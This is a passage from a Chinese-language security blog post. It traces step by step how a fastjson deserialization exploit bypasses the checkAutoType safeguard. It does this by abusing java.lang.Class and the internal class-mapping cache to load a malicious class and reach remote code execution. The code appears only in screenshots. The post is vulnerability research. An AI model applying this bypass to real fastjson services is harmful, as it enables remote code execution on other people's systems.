<p>接着有一个细节，因为程序扫描到接下来的字符为 “{“ 所以程序就会理解为是json中的value再次嵌套了json；所以就会重复调用 parseObject函数去解析；</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/gIFvm8"><img src="https://z3.ax1x.com/2021/05/19/gIFvm8.png" alt="gIFvm8.png"></a></p>
<p>然后还是按照之前的流程去拿到key。只不过这次是拿到的是value中的json的key；然后就可继续反序列化操作了；进入一个关键的判断</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/gIkQpR"><img src="https://z3.ax1x.com/2021/05/19/gIkQpR.png" alt="gIkQpR.png"></a></p>
<p>经过判断，发现key符合要求，并且特征也满足为true；然后进入下面代码块，去进行typename的获取；追溯一下不难发现是反复调用了scanSymbol函数，每次调用都要和”进行比对，从而可以完整的拿到引号中的代码；也就是我们传入的class；</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/gIkUtH"><img src="https://z3.ax1x.com/2021/05/19/gIkUtH.png" alt="gIkUtH.png"></a></p>
<p>可以显然的看到是首先拿到了第一个字符 j，然后后续会反复的调用scanSymbol函数直到匹配到” 为止，然后return一下；返回给typename变量；接下来就是代码构造的巧妙之处；继续追溯下：</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/gIAgr6"><img src="https://z3.ax1x.com/2021/05/19/gIAgr6.png" alt="gIAgr6.png"></a></p>
<p>看到其进了checkAutoType函数，因为我们之前无论如何构造，都是需要进入这个函数去进行check的，所以这里巧用白名单中的默认class和IdentityHashmap的mapping中的默认class，直接绕过check；</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/gIEPs0"><img src="https://z3.ax1x.com/2021/05/19/gIEPs0.png" alt="gIEPs0.png"></a></p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/gIZHMR"><img src="https://z3.ax1x.com/2021/05/19/gIZHMR.png" alt="gIZHMR.png"></a></p>
<p>success；</p>
<p>还有一个比较妙哉的点；为何我们要设置type为java.lang.Class? 追溯下不难发现；因为我们的初衷是调用MiscCodec类下的des方法从而去put我们的恶意类，那么在buckets中也即是IdentityHashMap的Entry中就写入了其相应的处理类：</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/gI1mMF"><img src="https://z3.ax1x.com/2021/05/19/gI1mMF.png" alt="gI1mMF.png"></a></p>
<p>所以才会去采用Class作为value；从而达到去调用put写入恶意class的效果；另外Class类的唯一实用性还有一点在后面的代码判断处：</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/gI8L5R"><img src="https://z3.ax1x.com/2021/05/19/gI8L5R.png" alt="gI8L5R.png"></a></p>
<p>这里只有当clazz为Class的class类型的时候才可触发loadClass，否则会进入后续的代码块，我当时尝试挖掘一个新的类，从而去代替Class；发现程序已经禁止了好多，没有绕过去，有点离谱；不过这也更加确定了Class类的唯一性；代码走到这里已经接近了我们的漏洞利用点；进入TypeUtils类中去调用loadClass方法，</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/gIGoWt"><img src="https://z3.ax1x.com/2021/05/19/gIGoWt.png" alt="gIGoWt.png"></a></p>
<p>追溯下loadClass中的方法；比较敏感的代码入下：</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/gIUgVU"><img src="https://z3.ax1x.com/2021/05/20/gIUgVU.png" alt="gIUgVU.png"></a></p>
<p>获取objVal的值；分析下是调用了DefaultJSONParser class下的parse方法；追溯在其中是调用了String下的substring函数对相应的区域块进行截取，从而拿到val的值；又因为拿到的val的值的时候是调用了String类下的方法，所以其返回的值为String对象；所以后续直接跳过大部分代码块进入直接赋值状态；</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/gIapsP"><img src="https://z3.ax1x.com/2021/05/20/gIapsP.png" alt="gIapsP.png"></a></p>
<p>接着就是一顿if判断，判断clazz是否为Class类型</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/gIajTU"><img src="https://z3.ax1x.com/2021/05/20/gIajTU.png" alt="gIajTU.png"></a></p>
<p>是的话就去调用loadClass；</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/gIdSfJ"><img src="https://z3.ax1x.com/2021/05/20/gIdSfJ.png" alt="gIdSfJ.png"></a></p>
<p>可以看到进入了mapping的put方法，去写入恶意的class到mapping中，那么再次加载的时候，会首先去mapping缓存中去读取相应的class；自然会读取到我们恶意的class然后进行调用反序列化，利用javabean机制触发漏洞；达到rce的效果；</p>
<p>至于fastjson的利用Class进行bypass check达到jndi注入的那个点，这里就不分析了，可以简单的调试一下就能明白；</p>

            <div class="clearfix"></div>
            <hr class="nogutter">
        </div>
        <nav class="m-pagination col-md-8 col-md-offset-2 col-sm-24" role="pagination">
    
    <a class="pull-left" href="/2021/05/20/java-urldns-unserialize/" style="float: left;">
        ← java urldns unserialize
    </a>
    
    
    <a class="pull-right" href="/2021/03/27/java-HashMap%E7%90%86%E8%A7%A3/">
        java HashMap深入理解 →
    </a>
    
</nav>

        <div class="col-md-8 col-md-offset-2 col-sm-24"><script type="text/javascript">
  /**
   * 搜狐畅言
   */

  /*
  document.write('<div id="SOHUCS" sid="' + window.location.pathname.slice(1) + '" ></div>');

  window.onload = function () {
    (function () {
      var appid = 'cytXXXX';
      var conf = 'prod_xxxxxxxxxxxxxxxxx';
      var width = window.innerWidth || document.documentElement.clientWidth;
      var loadJs = function (d, a, id) {
        var c = document.getElementsByTagName("head")[0] || document.head || document.documentElement;
        var b = document.createElement("script");
        b.setAttribute("type", "text/javascript");
        b.setAttribute("charset", "UTF-8");
        b.setAttribute("src", d);
        if (id) {
          b.setAttribute("id", id);
        }
        if (typeof a === "function") {
          if (window.attachEvent) {
            b.onreadystatechange = function () {
              var e = b.readyState;
              if (e === "loaded" || e === "complete") {
                b.onreadystatechange = null;
                a()
              }
            }
          } else {
            b.onload = a
          }
        }
        c.appendChild(b)
      };

      loadJs("https://changyan.sohu.com/upload/changyan.js", function () {
        window.changyan.api.config({
          appid: appid,
          conf: conf
        })
      });
    })();
  }
  */

</script>
</div>
    </div>
</section>


      
<!-- ============================ Footer =========================== -->

<footer>
    <div class="container">
            <div class="copy">
                <p>
                    &copy; 2014<script>new Date().getFullYear()>2010&&document.write("-"+new Date().getFullYear());</script>, Content By s1mple. All Rights Reserved.
                </p>
                <p>Theme By <a target="_blank" rel="noopener" href="//go.kieran.top" style="color: #767D84">Kieran</a></p>
            </div>
            <div class="social">
                <ul>
                    
                    <li><a href="https://github.com/" title="Github" target="_blank"><i class="icon-github"></i></a>&nbsp;</li>
                    
                    
                    <li><a href="https://twitter.com/" title="Twitter" target="_blank"><i class="icon-twitter"></i></a>&nbsp;</li>
                    
                    
                    <li><a href="https://www.facebook.com/" title="Facebook" target="_blank"><i class="icon-facebook"></i></a>&nbsp;</li>
                    
                    
                    <li><a href="https://google.com/" title="Google-Plus" target="_blank"><i class="icon-google-plus"></i></a>&nbsp;</li>
                    
                    
                    <li><a href="http://weibo.com/" title="Sina-Weibo" target="_blank"><i class="icon-sina-weibo"></i></a>&nbsp;</li>
                    
                </ul>
            </div>
            <div class="clearfix"> </div>
        </div>
</footer>

<!-- ============================ END Footer =========================== -->
      <!-- Load our scripts -->
<!-- Resizable 'on-demand' full-height hero -->
<script type="text/javascript">
    var resizeHero = function () {
        var hero = $(".cover,.heightblock"),
            window1 = $(window);
        hero.css({
            "height": window1.height()
        });
    };

    resizeHero();

    $(window).resize(function () {
        resizeHero();
    });
</script>
<script src="/js/plugins.min.js"></script><!-- Bootstrap core and concatenated plugins always load here -->
<script src="/js/scripts.js"></script><!-- Theme scripts -->


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
$('#intro').find('img').each(function(){
  var alt = this.alt;

  if (alt){
    $(this).after('<span class="caption" style="display:none">' + alt + '</span>');
  }

  $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox" rel="gallery" />');
});
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



      
</body>
</html>
